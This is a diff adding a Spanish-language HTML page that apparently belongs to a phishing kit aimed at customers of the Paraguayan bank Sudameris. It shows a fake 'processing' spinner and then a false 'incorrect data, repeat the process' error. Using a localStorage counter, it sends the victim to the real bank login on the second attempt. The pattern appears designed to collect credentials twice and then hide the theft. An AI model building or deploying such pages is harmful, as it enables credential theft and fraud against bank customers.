@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><link rel="icon" type="image/jpg" href="qjhdajksdlkahdjaslkd/fav.jpg">
+<meta charset="UTF-8">
+<title>Actualizando servidor</title>
+<style>
+  body {
+    background-color: rgba(0,0,0,0.6);
+    font-family: Arial, sans-serif;
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .loader {
+    border: 8px solid #f3f3f3;
+    border-top: 8px solid #e60012;
+    border-radius: 50%;
+    width: 80px;
+    height: 80px;
+    animation: spin 1s linear infinite;
+    margin-bottom: 20px;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+
+  .center-box {
+    background: white;
+    border-radius: 6px;
+    width: 400px;
+    padding: 20px;
+    text-align: center;
+    display: none;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+  }
+
+  .center-box h2 {
+    background: red;
+    color: white;
+    padding: 10px;
+    margin: -20px -20px 20px -20px;
+    border-top-left-radius: 6px;
+    border-top-right-radius: 6px;
+  }
+
+  .center-box p {
+    font-size: 16px;
+    color: #333;
+    margin-bottom: 20px;
+  }
+
+  .btn {
+    background: #e60012;
+    color: white;
+    border: none;
+    padding: 10px;
+    width: 100%;
+    border-radius: 4px;
+    font-size: 16px;
+    cursor: pointer;
+  }
+
+  .btn:hover {
+    background: #cc0010;
+  }
+
+  .loader-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
+
+  .text {
+    font-size: 18px;
+    color: white;
+    text-shadow: 1px 1px 2px black;
+  }
+</style>
+</head>
+<body>
+
+  <!-- Loader -->
+  <div class="loader-container" id="loadingScreen">
+    <div class="loader"></div>
+    <div class="text">Procesando datos, por favor espere...</div>
+  </div>
+
+  <!-- Cuadro de error -->
+  <div class="center-box" id="errorBox">
+    <h2>Error de verificación</h2>
+    <p>Los datos ingresados son incorrectos.<br>Por favor, repita el proceso.</p>
+    <button class="btn" onclick="window.location.href='index.html'">Volver al inicio</button>
+  </div>
+
+<script>
+  setTimeout(function(){
+    let intentos = localStorage.getItem("intentos_login") || 0;
+    let lastAttempt = localStorage.getItem("ultimo_intento") || null;
+    let now = Date.now();
+
+    // Si pasaron más de 10 minutos, reiniciamos contador
+    if (lastAttempt && (now - lastAttempt) > (10 * 60 * 1000)) {
+      intentos = 0;
+    }
+
+    intentos++;
+    localStorage.setItem("intentos_login", intentos);
+    localStorage.setItem("ultimo_intento", now);
+
+    if (intentos >= 2) {
+      window.location.href = "https://secure.sudameris.com.py/sudamerisweb/logins";
+    } else {
+      document.getElementById("loadingScreen").style.display = "none";
+      document.getElementById("errorBox").style.display = "block";
+    }
+  }, 5000); // 5 segundos
+</script>
+
+</body>
+</html>
